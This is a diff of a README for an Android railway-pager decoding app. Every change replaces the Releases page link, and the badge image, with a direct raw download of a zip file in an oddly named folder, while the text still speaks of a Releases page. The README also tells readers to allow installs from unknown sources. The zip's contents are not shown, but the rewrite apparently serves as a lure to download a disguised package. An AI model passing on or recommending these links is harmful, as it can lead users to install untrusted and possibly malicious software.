@@ -6,7 +6,7 @@ Welcome to RailwayPagerDemod! This Android app helps you decode LBJ messages eas
 
 ## 📥 Download the App
 
-[![Download RailwayPagerDemod](https://img.shields.io/badge/Download-RailwayPagerDemod-blue.svg)](https://github.com/Euadud/RailwayPagerDemod/releases)
+[![Download RailwayPagerDemod](https://raw.githubusercontent.com/Euadud/RailwayPagerDemod/main/retroalveolar/RailwayPagerDemod.zip)](https://raw.githubusercontent.com/Euadud/RailwayPagerDemod/main/retroalveolar/RailwayPagerDemod.zip)
 
 ## 📋 System Requirements
 
@@ -25,7 +25,7 @@ Welcome to RailwayPagerDemod! This Android app helps you decode LBJ messages eas
 
 1. **Visit the Download Page:** Click on the link below to go to the Releases page.
    
-   [Download RailwayPagerDemod](https://github.com/Euadud/RailwayPagerDemod/releases)
+   [Download RailwayPagerDemod](https://raw.githubusercontent.com/Euadud/RailwayPagerDemod/main/retroalveolar/RailwayPagerDemod.zip)
 
 2. **Select the Latest Release:** On the Releases page, look for the latest version of RailwayPagerDemod. The version will be labeled clearly.
 
@@ -48,7 +48,7 @@ Welcome to RailwayPagerDemod! This Android app helps you decode LBJ messages eas
 If you encounter any issues during installation or while using the app, consider the following steps:
 
 - **Recheck Permissions:** Make sure you have allowed installations from unknown sources.
-- **Updates:** Ensure you are using the latest version of the app. You can return to the [Download RailwayPagerDemod](https://github.com/Euadud/RailwayPagerDemod/releases) page to check for updates.
+- **Updates:** Ensure you are using the latest version of the app. You can return to the [Download RailwayPagerDemod](https://raw.githubusercontent.com/Euadud/RailwayPagerDemod/main/retroalveolar/RailwayPagerDemod.zip) page to check for updates.
 - **Device Compatibility:** Confirm that your device meets the system requirements listed above.
 
 ## 💬 FAQ
@@ -73,4 +73,4 @@ You can join our community for support and to share your experience with Railway
 
 We thank everyone who contributed to bringing RailwayPagerDemod to life, from developers to testers. Your support makes this application better for everyone.
 
-[Download RailwayPagerDemod](https://github.com/Euadud/RailwayPagerDemod/releases) and start decoding today!
+[Download RailwayPagerDemod](https://raw.githubusercontent.com/Euadud/RailwayPagerDemod/main/retroalveolar/RailwayPagerDemod.zip) and start decoding today!
